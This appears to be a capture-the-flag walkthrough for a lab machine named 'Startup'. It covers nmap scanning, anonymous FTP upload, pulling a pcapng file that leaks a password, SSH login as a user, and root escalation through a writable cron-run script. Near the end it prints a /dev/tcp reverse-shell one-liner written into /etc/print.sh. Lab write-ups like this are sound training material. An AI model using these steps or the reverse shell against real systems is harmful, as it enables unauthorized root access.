# Startup

## Nmap

```
sudo nmap 10.10.85.9 -p- -sS -sV     

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Anonymous login is allowed on FTP. We have two files a jpg and a txt document. I downloaded both. I also checked for file upload on the ftp directory within and was able to upload a test document.

![](<../../../.gitbook/assets/image (1012).png>)

**Contents of notice.jpg:**

```
Whoever is leaving these damn Among Us memes in this share.
It IS NOT FUNNY. People downloading documents from our website 
will think we are a joke! Now I dont know who it is, but Maya is 
looking pretty sus.
```

**Important.jpg:**

![](<../../../.gitbook/assets/image (1013) (1).png>)

```
python3 dirsearch.py -u http://10.10.85.9 -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 60 --full-url 
```

![](<../../../.gitbook/assets/image (1015) (1).png>)

![](<../../../.gitbook/assets/image (1016) (1).png>)

![](<../../../.gitbook/assets/image (1014).png>)

Looking through the directories in '/' we have the incidents folders and within with have a pcapng file of interest. We can host a Python SimpleHTTPServer on the target machine in this directory.

```
python -m SimpleHTTPServer 8080
```

![](<../../../.gitbook/assets/image (1017).png>)

Then use `wget` on our attacking machine to download the pcapng file.

![](<../../../.gitbook/assets/image (1018) (1).png>)

Going through Wireshark manually for each packet we find an interesting string on packet #178.

![](<../../../.gitbook/assets/image (1019).png>)

Right clicking the packet and following the TCP Stream reveals more information and shows a command history log from a web shell. Likely due to previous compromise.

![](<../../../.gitbook/assets/image (1020).png>)

We cant take the password value and SSH in as the other user on the box who is Lennie.

![](<../../../.gitbook/assets/image (1021).png>)

We can see from Lennie's home directory a scripts folder. planner.sh is of interest but looks like we are unable to manipulate the file.

![](<../../../.gitbook/assets/image (1022).png>)

However, the file print.sh which is executed as part of planner.sh is owned by us.

![](<../../../.gitbook/assets/image (1023) (1).png>)

First we need to check if the scripts are executed as part of a timed process. I downloaded pspy64 onto the attacking machine and executed.

After a short while we see the following is executed on regular intervals:

![](<../../../.gitbook/assets/image (1024).png>)

As such we can replace the contents of /etc/print.sh with that of a reverse shell and wait for a root shell to spawn.

```
echo  > /etc/print.sh
echo '0<&196;exec 196<>/dev/tcp/10.14.3.108/443; sh <&196 >&196 2>&196' > /etc/print.sh
```

![](<../../../.gitbook/assets/image (1025).png>)

As soon receive a shell as root.

![](<../../../.gitbook/assets/image (1026) (1).png>)
